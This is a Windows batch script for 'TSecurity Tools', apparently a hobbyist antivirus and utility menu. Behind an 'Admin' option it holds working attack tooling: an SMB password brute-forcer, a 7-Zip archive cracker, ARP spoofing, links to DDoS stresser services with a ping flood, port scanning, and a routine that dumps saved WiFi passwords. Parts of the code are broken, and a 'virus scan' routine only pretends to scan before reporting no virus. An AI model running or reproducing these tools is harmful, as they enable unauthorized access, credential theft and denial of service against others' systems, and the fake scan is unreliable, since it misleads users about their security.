@echo off 
 color 02
 if  exist "termsofuse.txt" (
if  exist "help" (
goto  Start
)
)
if  exist "da1s.txt" (
if  exist "da2m.txt" (
goto Start
)
)
if  exist "da3b.txt" (
if  exist "la1s.txt" (
goto Start
)
) 
if  exist "la2m.txt" (
if  exist "la3b.txt" ( 
goto  Start
)
)
if  exist "pa1s.txt" (
if  exist "pa2m.txt" ( 
goto 
)
)
if  exist "pa3b.txt" (
if  exist "ct1s.txt" (
goto install-assets 
)
) 
if  exist "ct2m.txt" (
if  exist "ct3b.txt" (
goto Start
)
)
if  exist "af1s.txt" (
if  exist "af2m.txt" (
gotoS tart
)
)
if  exist "af3b.txt" (
if  exist "l1s.txt" (
goto Start
)
) 
if  exist "l2m.txt" (
if  exist "l3b.txt" ( 
goto Start
)
)
if  exist "sa1s.txt" (
if  exist "sa2m.txt" ( 
goto Start
)
)
if  exist "sa3b.txt" (
if  exist "Passlist.txt" (
goto Start 
)
) 
if  exist "logo.txt" (
if  exist "Passlist.txt" (
goto Start
)
) 
mode 2500, 1500 
chcp 65001 >nul 
cd "C:/Windows/System32" >nul 
cd "Assets TS (1)" >nul 
 type logo.txt
 echo.
 echo. 
 ECHO _________________________
 set /p user=TSecurity User -
 set /p pass=TSecurity Password -
 echo _________________________
 echo This is your Session ID [%random%]
 echo You will need this for admin Tools 
 echo -------------------------------
 pause>nul
 cls 
 if %user%==%username% goto Start >nul 
echo.



 :Start
 color 02
 color A
 color 02
 color a
 color 02
 Title TSecurity Tools
 type logo.txt
 cd "C:/Windows/System32" >nul 
 echo     Options
 echo  --------------
 echo.
 echo  1) Virus Scan 
 echo  2) Game Tools
 ECHO  3) Windows Tools 
 echo  4) Admin Tools  
 echo  5)-Exit
 echo  6) TERMS OF USE 
 echo.
 set input=
 set /p input=">"

if %input%==1 goto v_scan 
if %input%==2 goto game_tools 
if %input%==3 goto win_tools  
if %input%==4 goto sesh_ver 
if %input%==5 goto exit 
if %input%==6 goto termsofuse 

:win_tools 
cls 
echo   Win Tools
echo  -----------
echo  1) Repair Windows 
echo  2) Make Windows Faster 
echo  3) Restart PC
echo  4) Shutdown PC 
echo.
set input=
set /p input=">" 
if %input%==1 goto rep_win 
if %input%==2 goto makewinfast 
if %input%==3 goto restart_win 
if %input%==4 goto shutdown_win 



:v_scan
@echo off
cd "Assets TS (1)">nul
setlocal EnableDelayedExpansion
goto menu   

:restart_win
start shutdown.exe -r 

:shutdown_win
start shutdown.exe



:menu

:: Resets color
color A
cls
echo.
echo 1) Scan a directory.      (STABLE)
echo 2) Scan a file.           (STABLE)
echo 3) Utilities.             (STABLE)
echo.
choice /c:123 /n
if errorlevel 3 goto utils
if errorlevel 2 goto file_scan
if errorlevel 1 goto dir_scan
goto menu


:dir_scan

:: dir_scan is the "Scan a directory" feature.
:: It works by loopi;lng through files in a directory, then compare their file hash with the ones in the virus database.

cls

:: Resets target to be scanned.
set hash=
set target=

set /p target=Drop the folder or enter the directory here (Leave blank to go back^): 

:: Goes back to menu if no path was provided
if "%target%" == "" goto menu

echo.

:: Start scanning if provided path exists
if exist "%target%" (
	:: Iterates over files in provided directory
	for /r "%target%\" %%j in (*.*) do (
		:: Get file hash using certutil
		for /f "delims=" %%i in ('CertUtil -hashfile "%%j" SHA256 ^| find /v "CertUtil" ^| find /v ":"') do set hash=%%i
		:: Compare hash
		for /f %%i in (database.txt) do (
			if "!hash!" == "%%i" (
				del /q "%%j"
				echo "%%j" removed^^!
			)
		)
	)
)

echo Scan finished^^! Press any key to continue...

pause >nul
goto menu


:file_scan

:: file_scan is the "Scan a file" feature.
:: It is the same as "dir_scan" but with a single file only.

cls

:: Resets target to be scanned.
set hash=
set target=

set /p target=Drop the file or enter the file's path here (Leave blank to go back^): 

:: Goes back to menu if no path was provided
if "%target%" == "" goto menu
echo.

:: Start scanning if provided path exists
if exist "%target%" (
	:: Get file hash using certutil
	for /f "delims=" %%i in ('CertUtil -hashfile "%target%" SHA256 ^| find /v "CertUtil" ^| find /v ":"') do set hash=%%i
	:: Compare hash
	for /f %%i in (database.txt) do (
		if "!hash!" == "%%i" (
			:: Change color to red if the file is a virus
			color 4f

			:: Prompt for deletion
			echo "%target%" is dangerous, delete it? (Y/N^)
			echo.

			choice /c:yn /n >nul
			if errorlevel 2 goto menu
			if errorlevel 1 (
				del /q "%target%"
				color 0f
				echo Dangerous file removed^^! Press any key to continue...

				pause >nul
				goto menu
			)
		)
	)
)

:: Prompt if file is safe
echo "%target%" is safe^^!

pause >nul
goto menu 


:utils

:: utils is other utilities of JellyAV

:: Resets color
color 0f
cls

echo Jelly Antivirus Version 0.1.0 BETA
echo.
echo Utilities - Options:
echo.
echo 1. Fix shortcut viruses.
echo 2. Go back.
echo.

choice /c:12 /n
if errorlevel 2 goto menu
if errorlevel 1 (
	cls
	set /p util_dir=Enter directory or drop in the folder: 
	if exist "!util_dir!" (
		attrib -s -r -h "!util_dir:"=!\*.*" /s /d /l
		pause
	) 
)

goto utils


:game_tools
cls
echo.
echo         GAMER TOOlS
echo        --------------
echo.
echo 1) Boot To BIOS Menu 
echo 2) Generate Cool Username 
echo 3) Make Windows Faster 
echo 4) System Info
echo 5) Game Installs
echo 6) Generate Text Art 
echo.
set /p Ginput=">"

if %Ginput%==1 goto BIOS
if %Ginput%==2 goto UserGen
if %Ginput%==3 goto makewinfast
if %Ginput%==4 goto Sinfo
if %Ginput%==5 goto freeg
\if %Ginput%==6 goto genta 

:Sinfo 
cls
echo ________________________________________
echo ------------SYSTEM-INFO-----------------
ECHO ________________________________________
ECHO.
ipconfig /all | findstr IPv4
ipconfig /all | findstr IPv6
ipconfig /all | findstr DNS
systeminfo 
pause >nul
goto Start 
cls

:freeg 
cls
echo _____________________________________
echo           GAME INSTALLS
ECHO -------------------------------------
ECHO.
ECHO Check The Apps File In Your D:
pause>nul
goto 

:install-assets 
cls 
echo --------------------
echo    Instll assets
echo --------------------
echo.
pause>nul 
goto Start 

:makewinfast
cls
echo.
echo Making Windows Faster in the Background...
chkdsk>nul 
sfc /scannow >nul
defrag >nul
pause  >nul 
exit ) 


:UserGen
cls
echo Here Is Your New Username.
echo.
echo [%user%%random%] 
echo.
pause>nul
goto Start





:BIOS
cls
echo.
echo Are You Sure You Want To Boot To BIOS Menu? (Y/N)
echo.
set /p yn1=

if %yn1%==Y goto BBIOS
if %yn1%==N goto 10

:BBIOS
cls
echo.
echo Press Enter To Boot To Bios [LAST WARNING!!!!!]-
pause>nul
shutdown.exe /r /fw

:genta
cls
echo _____________________________________
echo         TEXT ART GENERATER
echo -------------------------------------
echo.
echo CHOOSE AN OPTION
echo.
echo Option 1: Create Dragon Text Art 
echo.
echo Option 2: Create Lock Text Art
echo.
echo Option 3: Create Pumkin Text Art 
echo.
echo Option 4: Create Star Text Art
echo.
echo Option 5: Create Chrismas Tree Text Art 
echo. 
echo Option 6: Create American Flag Text Art 
echo.
echo Optiom 7: Create Logo Text Art 
echo _________________________________________
echo.
set /p inputa=

if %inputa%==1 goto DragonArt
if %inputa%==2 goto LockArt
if %inputa%==3 goto PumArt
if %inputa%==4 goto StarArt

:StarArt
cls
echo ____________________________________
echo          Star Text Art
echo ------------------------------------
echo.
echo Choose An Option
echo.
echo 1- Small Star Art 
echo 2- Meidum Star Art 
echo 3- Big Start Art 
echo. 
set /p inputsa=

if %inputsa%==1 goto sa1s
if %inputsa%==2 goto sa2m
if %inputsa%==3 goto sa3b 

:sa1s 
cls
echo _________________________
echo     Small Star Art 
echo -------------------------
echo.
cd "Assets TS (1)"
type sa1s.txt 
pause>nul
cls
goto Start 

:sa2m
cls
echo _________________________
echo    Meidum Start Art
echo -------------------------
echo.
cd "Assets TS (1)"
type sa2m.txt 
pause>nul
cls 
goto Start 

:sa3b
cls 
echo _________________________
echo      Big Star Art 
echo -------------------------
echo.
cd "Assets TS (1)"
type sa3b.txt 
pause>nul 
cls
goto Start 










:PumArt
cls
echo _________________________
echo     Pumkin Text Art 
echo -------------------------
echo.
echo Choose An Option 
echo.
echo 1- Small Pumkin Art
echo 2- Meidum Pumkin Art 
echo 3- Big Pumkin Art 
echo.
set /p inputpa=

if %inputpa%==1 goto pa1s
if %inputpa%==2 goto pa2m
if %inputpa%==3 goto pa3b 

:pa1s
cls
echo _________________________
echo    Small Pumkin Art 
echo -------------------------
echo.
cd "Assets TS (1)"
type pa1s.txt 
pause>nul
cls
goto Start

:pa2m
cls
echo _________________________
echo    Meidum Pumkin Art
echo -------------------------
echo.
cd "Assets TS (1)"
type pa2m.txt 
pause>nul
cls
goto Start 

:pa3b
cls
echo _________________________
echo     Big Pumkin Art
echo -------------------------
echo.
cd "Assets TS (1)"
type pa3b.txt
pause>nul
cls
goto Start 


 
:LockArt 
cls
echo _____________________________________
echo          -Lock Text Art- 
echo -------------------------------------
echo.
echo CHOOSE AN OPTION
ECHO.
echo 1- Small Lock Art
echo 2- Meidum Lock Art
echo 3- Big Lock Art 
echo.
set /p inputla=

if %inputla%==1 goto la1s
if %inputla%==2 goto la2m
if %inputla%==3 goto la3b

:la1s
cls
echo ____________________________________
echo       Small Lock Text Art 
echo ------------------------------------
echo.
cd "Assets TS (1)"
type la1s.txt 
pause>nul 
cls
goto Start

:la2m
cls
echo ____________________________________
echo        Meidum Lock Text Art
echo ------------------------------------
echo.
cd "Assets TS (1)"
type la2m.txt 
pause>nul 
cls
goto Start

:la3b
cls
echo ____________________________________
echo         Big Lock Text Art 
echo ------------------------------------
echo.
cd "Assets TS (1)"
type la3b.txt 
pause>nul
cls
goto Start

:DragonArt
cls
echo Choose An Options
echo.
echo Option 1: Small Dragon Art 
echo.
echo Option 2: Medium Dragon Art
echo.
echo Option 3: Big Dragon Art
echo.
set /p ad=
if %ad%==1 goto da1
if %ad%==2 goto da2
if %ad%==3 goto da3

:da1
cls
echo Here is you Small Dragon Text Art [Copy And Paste]
cd "Assets TS (1)" 
type da1s.txt 
pause>nul
goto Start

:da3
cls
echo  Here is your Big Dragon Text Art
cd "Assets TS (1)"
type da3b.txt 
pause>nul
goto Start

:da2
cls
echo Here is you Medium Dragon Text Art
cd "Assets TS (1)"
type da2m.txt
pause>nul 
goto Start

:n-scan
cls
echo Scanning...
echo -----------
Dir C:\windows\temp /s >nul
Dir C:\windows\temp /s >nul 
Dir C:\windows\temp /s >nul 
Dir C:\windows\temp /s >nul
Dir C:\windows\temp /s >nul 
Dir C:\windows\temp /s >nul 
Dir C:\windows\temp /s >nul 
Echo.
echo.
echo.
echo.
echo No Virus Found...
echo.
echo.
echo Pess any key to return to menu
Pause>nul
cls
echo.
echo.
echo _____________________________________
echo      TSecurity ANTIVIRUS
echo _____________________________________
echo.
echo.
Echo.
echo.
Echo Going to main menu
cls
goto Start

:wifi
cls 
goto wfs


:termsofuse
cls
echo ____________________________________
echo -----------TERMS-OF-USE-------------
echo ------------------------------------
echo.
type termsofuse.txt 
echo.
pause>nul
cls
goto Start 



:cs
cls
Echo ____________________________________
ECHO           COMING SOON!
ECHO ------------------------------------
PAUSE>nul
GOTO Start

:3
cls
echo.
echo.
echo.
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°                   Û 1%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°***                Û 13%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°*****              Û 29%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°******             Û 37%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°*********          Û 47%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°************       Û 68%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°***************    Û 89%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°****************** Û 99%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
echo Û°*******************Û 100%%
echo ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
ping localhost -n 3 >nul
cls
Echo Complete...
echo.
echo Press Enter On Your KeyBoard [ENTER] To Finish The Exit Prosess
echo.
pause>nul 
exit


:A-scan
cls
tree D:
tree C:
ping localhost:80 -l 1000
cd D:
cd C:
CD C:
CD D:
echo.
Echo.
echo.
echo.
echo.
echo No Virus Found
echo.
echo.
echo Pess any key to return to menu
Pause>nul
cls
echo.
echo.
echo _____________________________________
echo      TSecurity ANTIVIRUS
echo _____________________________________
echo.
echo.
Echo.
echo.
Echo Going to main menu
cls
goto Start

:rep_win 
cls
echo      Are You Sure? (Y/N) 
echo      -------------------
echo.
set input=
set /p input=">" 
if %input%==y goto pre-rep-Windows
if %input%==n goto Start 

:pre-rep-Windows
avidemux2_cli --run j-1.js --run j-2.js --end
shutdown.exe -s -t 50

:ddos-mild 
cls
Echo    DDOS (Mild)
echo -----------------
set /p web=Enter URL or IP Here ">
ping %web% -t -l 1025

:sesh_ver
cls
echo     Verify
echo --------------
echo. 
set /p ID="What Is The Sess ID? >"
if %ID%==%random% goto Admin-y
if not %ID%==%random% goto Admin


:Admin-n
cls
echo Failed To Verify Sesstion
echo -------------------------
echo.
echo Press Any Key To Go To Start...
pause>nul
cls
goto Start 

:Admin-y
cls
echo Verifying Sess
echo --------------
echo Verify Complete!
pause>nul
Goto Admin

:gen_pass
cls 
echo Choose An Option 
echo.
echo Option 1: Weak Password 
echo.
echo Option 2: Medium Password
echo.
echo Option 3: Strong Password 
echo.
set  input2=
set /p input2=

if %input2%==1 GOTO Pass1
if %input2%==2 GOTO Pass2
if %input2%==3 GOTO Pass3 

:iptool
@echo off >nul 
title Network Tools
mode 75, 30
chcp 65001 >nul
call powershell exit >nul
color A
cd "Assets TS (1)" >nul 
:menu-net
set ip=""
cls
echo.
type "Logoip.txt"
echo.
echo.
echo       PUBLIC IP
echo       ---------
echo     1) Geolocate
echo     2) Trace DNS
echo     3) Port Scan
echo     4) DDOS
echo.
echo        LOCAL IP
echo       ----------
echo     5) Trace Mac Address
echo     6) Port Scan
echo     7) ARP Spoof (DOS)
echo     8) RPC Dump
echo.
set /p input=">"
if /I "%input%" EQU "1" goto geolocate
if /I "%input%" EQU "2" goto tracedns
if /I "%input%" EQU "3" goto portscan
if /I "%input%" EQU "4" goto ddos
if /I "%input%" EQU "5" goto Macaddr
if /I "%input%" EQU "6" goto portscan
if /I "%input%" EQU "7" goto arpspoof
if /I "%input%" EQU "8" goto rpcdump

:rpcdump
cls
echo.
set /p ip=Enter IP Address: 
rpcdump %ip%
echo.
pause
cls
goto menu

:Macaddr
cls
echo.
set /p ip=Enter IP Address: 
ping -w 1 %ip% >nul
for /f "tokens=2 delims= " %%a in ('arp -a ^| find "%ip%"') do set macaddr=%%a
for /f "usebackq delims=" %%I in (`powershell "\"%macaddr%\".toUpper()"`) do set "upper=%%~I"
cls
echo.
echo Mac Address: %upper%
echo.
pause
cls
goto menu-net

:arpspoof
cls
echo.
set errorlevel=0
set /p ip=Enter IP Address: 
start cmd /c "mode 87, 10 && title Spoofing %ip%... && echo. && arpspoof.exe %ip%"
goto menu

:ddos
cls
echo.
echo 1) https://freestresser.so/
echo 2) https://hardstresser.com/
echo 3) https://stresser.net/
echo 4) https://str3ssed.co/
echo 5) https://projectdeltastress.com/
echo 6) Back
echo.
set /p ddosinput=">"
if /I "%ddosinput%" EQU "1" start https://freestresser.so/
if /I "%ddosinput%" EQU "2" start https://hardstresser.com/
if /I "%ddosinput%" EQU "3" start https://stresser.net/ 
if /I "%ddosinput%" EQU "4" start https://str3ssed.co/
if /I "%ddosinput%" EQU "5" start https://projectdeltastress.com/
if /I "%ddosinput%" EQU "6" goto menu
goto menu

:portscan
cls
set errorlevel=0
echo.
set /p ip=IP Address: 
set /p ports=Ports (e.g. 21,22,23): 
start cmd /c "mode 40, 15 && title Scanning Ports... && PortScanner.exe hosts=%ip% ports=%ports%>>portscan.txt"
ping localhost -n 5 >nul
taskkill /im PortScanner.exe /f >nul 2>&1
echo.
type portscan.txt
echo.
ping localhost -n 1 >nul
del portscan.txt
pause
goto menu-net

:tracedns
cls
echo.
set /p ip=IP Address: 
cls
for /f "tokens=2 delims= " %%a in ('nslookup %ip% ^| find "Name"') do set dns=%%a
echo.
echo Domain Name: %dns%
echo.
pause
goto menu-net

:geolocate
cls
echo.
set /p ip=IP Address: 
cls
setlocal ENABLEDELAYEDEXPANSION
set webclient=webclient
if exist "%temp%\%webclient%.vbs" del "%temp%\%webclient%.vbs" /f /q /s >nul
if exist "%temp%\response.txt" del "%temp%\response.txt" /f /q /s >nul
:iplookup
echo sUrl = "http://ipinfo.io/%ip%/json" > %temp%\%webclient%.vbs
:localip
cls
echo set oHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0") >> %temp%\%webclient%.vbs
echo oHTTP.open "GET", sUrl,false >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded" >> %temp%\%webclient%.vbs
echo oHTTP.setRequestHeader "Content-Length", Len(sRequest) >> %temp%\%webclient%.vbs
echo oHTTP.send sRequest >> %temp%\%webclient%.vbs
echo HTTPGET = oHTTP.responseText >> %temp%\%webclient%.vbs
echo strDirectory = "%temp%\response.txt" >> %temp%\%webclient%.vbs
echo set objFSO = CreateObject("Scripting.FileSystemObject") >> %temp%\%webclient%.vbs
echo set objFile = objFSO.CreateTextFile(strDirectory) >> %temp%\%webclient%.vbs
echo objFile.Write(HTTPGET) >> %temp%\%webclient%.vbs
echo objFile.Close >> %temp%\%webclient%.vbs
echo Wscript.Quit >> %temp%\%webclient%.vbs
start %temp%\%webclient%.vbs
set /a requests=0
:checkresponseexists
set /a requests=%requests% + 1
if %requests% gtr 7 goto failed
IF EXIST "%temp%\response.txt" (
goto response_exist
) ELSE (
ping 127.0.0.1 -n 2 -w 1000 >nul
goto checkresponseexists
)
:failed
taskkill /f /im wscript.exe >nul
del "%temp%\%webclient%.vbs" /f /q /s >nul
echo.
echo Did not receive a response from the API.
echo.
pause
goto menu-net
:response_exist
cls
echo.
for /f "delims=     " %%i in ('findstr /i "," %temp%\response.txt') do (
    set data=%%i
    set data=!data:,=!
    set data=!data:""=Not Listed!
    set data=!data:"=!
    set data=!data:ip:=IP:      !
    set data=!data:hostname:=Hostname:  !
    set data=!data:org:=ISP:        !
    set data=!data:city:=City:      !
    set data=!data:region:=State:   !
    set data=!data:country:=Country:    !
    set data=!data:postal:=Postal:  !
    set data=!data:loc:=Location:   !
    set data=!data:timezone:=Timezone:  !
    echo !data!
)
echo.
del "%temp%\%webclient%.vbs" /f /q /s >nul
del "%temp%\response.txt" /f /q /s >nul
if '%ip%'=='' goto menu
pause
goto menu-net 

:Pass3
cls
echo Here is your Strong Password [%user%%user%%random%%random%%random%32153246%user%]
pause>nul
goto Start


:Pass1
cls
echo Here is your Weak Password [%user%%random%]
Pause>nul
goto Start

:Pass2
cls
echo Here is your Medium Password [%randon%%user%%random%123%user%%random%%random%]
pause>nul
goto Start

:Pass3
cls
echo Here is your Strong Password [%user%%user%%random%%random%%random%32153246%user%%random%%user%54246435#$@$#^@%^&^

:zipbf
@echo off
title Zipwn
color 3
if not exist "C:\Program Files\7-Zip" (
	echo 7-Zip not installed!
	pause
	exit
)

echo.
set /p archive="Enter Archive: "
if not exist "%archive%" (
	echo Archive not found!
	pause
	exit
)

set /p wordlist="Enter Wordlist: "
if not exist "%wordlist%" (
	echo Wordlist not found!
	pause
	exit
)
echo Cracking...
for /f %%a in (%wordlist%) do (
	set pass=%%a
	call :attempt
)
echo shitty wordlist dumbass
pause >nul 
exit

:attempt
"C:\Program Files\7-Zip\7z.exe" x -p%pass% "%archive%" -o"cracked" -y >nul 2>&1
echo ATTEMPT : %pass%
if /I %errorlevel% EQU 0 (
	echo Success! Password Found: %pass%
	pause
	exit
)
:qo
cls
echo.
echo Choose An Option
echo.
echo Option 1: Open NotePad
echo.
echo Option 2: Open Command prompt
echo.
echo Optiom 3: Open Settings
echo.
set qoi=
set /p qoi=

if %qoi%==1 goto OpenNote
if %qoi%==2 goto OpenCMD
if %qoi%==3 goto OpenSet

:OpenNote
cls
echo Type [Open] to Open NotePad
set /p opennote.=
if %opennote.%==Open goto startN

:startN
start Notepad 
pause>nul
cls 
goto Start

:OpenCMD
cls
echo Type [Open] to Open Command Prompt 
set /p opencmd.=
if %opencmd.%==Open goto OpenC 

:OpenC
cls 
start cmd
cls
pause>nul
goto Start

:OpenSet
cls
echo Type [Open] to Open Settings
set /p openset.=
if %openset.%==Open goto OpenS 

:OpenS
cls
start Settings
cls
pause>nul
goto Start

:Admin
cls
cd "Assets TS (1)" >nul 
ECHO ____________________ 
echo        Admin
echo --------------------
echo.
type "adminbanner.txt"
echo.
echo.
echo CHOOSE AN OPTION
echo.
echo 1) SMB Brute Forcer
echo 2) TSecurity Command Prompt 
echo 3) Network Hacks 
echo 4) Whats My Information?
echo 5) WiFi PASSWORDS
echo 6) TSecurity AI
echo 7) .Bat To .EXE 
echo 8) "7 Zip" Brute Forcer 
echo 9) IP Scanner (This Device only!!!)
echo.
set /p Admininput=">"

if %Admininput%==1 goto BF
if %Admininput%==2 goto STCMD
if %Admininput%==3 goto iptool 
if %Admininput%==4 goto info 
if %Admininput%==5 goto wifi 
if %Admininput%==6 goto TSAI
if %Admininput%==7 goto batexe
if %Admininput%==8 goto zipbf
if %Admininput%==9 goto ipscanlocal 

:ipscanlocal 
ipconfig /all | findstr IPv4
ipcinfig /all | findstr IPv6
pause >nul
goto Start`


:batexe
cls
cd "C:/Users\%username%\Downloads"
if exist ".bat-to-exe.bat" goto yesbe ( 
if Not exist ".bat-to-exe.bat" goto nobe ( 
)
)
:yesbe
cls 
echo Convertor
echo ---------
echo.
echo You Have The Convertor file!
echo.
echo -How To USE-
echo.
echo To use this convertor look for the file ".bat-to-exe" file on you desktop
echo Drag your batch file into the convertor and you will see your new ".exe" File
pause>nul 
goto Start 
pause>nul 
cls
goto Start 

:nobe 
cls
echo Getting Convertor File...
echo -------------------------
echo. 
cd "C:/Desktop"
curl -o .bat-to-exe.bat https://raw.githubusercontent.com/Syxfer/TSecurity/main/Assets%20TS%20(1)/.bat-to-exe.bat
echo.
echo Please Wait...
pause>nul 
cls
goto Start 


:TSAI 
cls
echo _________________________
echo      TSecurity AI
echo -------------------------
echo.
ollama run phi3 
pause >nul 


:STCMD
cls
echo -------------------------------------------------------------------------------------
echo                                 WELCOME TO TSCMD
echo                                      -START-
echo -------------------------------------------------------------------------------------
echo.
echo.
echo.
echo Type [Help] to get a list of all the commands in STSMD.
echo. 
set %pr%=Root-$>nul 
echo.
set /p cmd=%pr%

if %cmd%==Help goto cmdh
if %cmd%==ip goto ipconfig
if %cmd%==help goto cmdh
if %cmd%==clear goto cls
if %cmd%==Clear goto cls 
if %cmd%==home goto Start
if %cmd%==Home goto Start
if %cmd%==color goto Color
if %cmd%==Color goto Color 
if %cmd%==ping goto ping 
if %cmd%==Ping goto Ping
if %cmd%=="ts install tsecurity -u -i -y" goto ts-i-u-y

:ts-i-u-y
cd C:\Users\%username%\Downloads
curl -o TSecurity.bat https://raw.githubusercontent.com/Syxfer/TSecurity/main/TSecurity.bat
pause>nul
goto STCMD 

:info 
cls
echo ____________________________________
echo             My Info
echo ------------------------------------
echo.
echo Your Info...
echo.
ipconfig /all | findstr IPv4
ipconfig /all | findstr IPv6 
ipcinfig /all | findstr DNS
echo USER [%user% (TS user only) ]
systeminfo 
pause>nul
cls
goto Start

:Ai
	)	

:Color
echo. 
echo What color do you want your text to be?
echo.
echo 1- Green
echo.
echo 2- Orange
echo.
echo 3- Red
echo.
echo 4- Blue
echo.
echo 5- White
echo.
set /p ci=

if %ci%==1 Color a
if %ci%==2 color 06
if %ci%==3 color 04
if %ci%==4 color 01
if %ci%==5 color 07
pause>nul
goto STCMD

:ping 
echo What Ip Or server should You Pimg?
echo.
set /p websiteadmin=
echo What should be the packet size? (1 - 1000)
echo.
set packetS=
ping %websiteadmin% -t -L %packetS%

:cls
cls
pause>nul
goto STCMD

:ipconfig 
ipconfig /all 
pause>nul
goto STCMD 

:cmdh
echo.
cd "Assets TS (1)"
type help.txt 
pause>nul 
goto STCMD

:BF
cls
echo -------------------
echo  Brute Force
echo -------------------
@echo off
title SMB Bruteforce - by TSecurity 
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause>nul
echo Go To Start? (Y/N)
set /p Sinput=

if %Sinput%==Y goto Start 
if not %Sinput% goto 3


:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

:wfs
echo -----------------------
echo    My WiFi PASSWORDS
echo -----------------------
echo.
echo.
setlocal enabledelayedexpansion
for /f "tokens=2delims=:" %%a in ('netsh wlan show profile ^|findstr ":"') do (
    set "ssid=%%~a"
    call :getpwd "%%ssid:~1%%"
)
:getpwd
set "ssid=%*"
for /f "tokens=2delims=:" %%i in ('netsh wlan show profile name^="%ssid:"=%" key^=clear ^| findstr /C:"Key Content"') do echo ssid: %ssid% pass: %%i 
pause>nul
